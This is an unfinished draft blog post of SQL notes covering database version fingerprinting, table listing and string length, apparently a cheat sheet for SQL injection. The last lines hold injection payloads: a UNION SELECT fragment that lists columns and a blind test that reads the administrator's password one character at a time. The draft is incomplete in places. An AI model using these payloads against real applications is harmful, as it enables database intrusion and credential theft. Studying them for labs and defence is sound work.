@@ -1,0 +1,59 @@
+---
+layout: post
+title: Quiries
+status: in progress
+type: post
+published: false
+comments: true
+date: 2022-01-01
+---
+### Quires
+ 
+  #### Get database info
+ On Oracle this gives version details:
+ ```SQL
+ SELECT * FROM v$version
+ ```
+ 
+ To get the tables that exist:
+ ```SQL
+ SELECT * FROM  information_schema.tables
+ ```
+ normally works+
+ 
+ 
+ ### Database type and version request
+ 
+ The following return database version for the specified popular database
+ 
+| Data base type   | Query                     |
+|------------------|---------------------------|
+| Microsoft, MySQL | `SELECT @@version`          |
+| Oracle           | `SELECT * FROM v$version`    |
+| PostgreSQL       | `SELECT version()`          |
+
+ - Note: For Oracle Banner is one of the *
+
+
+### Get table info
+
+#### get all tables
+It seems that 
+For PostgreSQL
+```sql
+SELECT table_name FROM information_schema.tables
+```
+
+
+
+#### get all columns for a table
+For PostgreSQL
+```SQL
+UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'Table name' --
+```
+
+### Get string length
+
+`LENGTH(string)`
+
+SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm
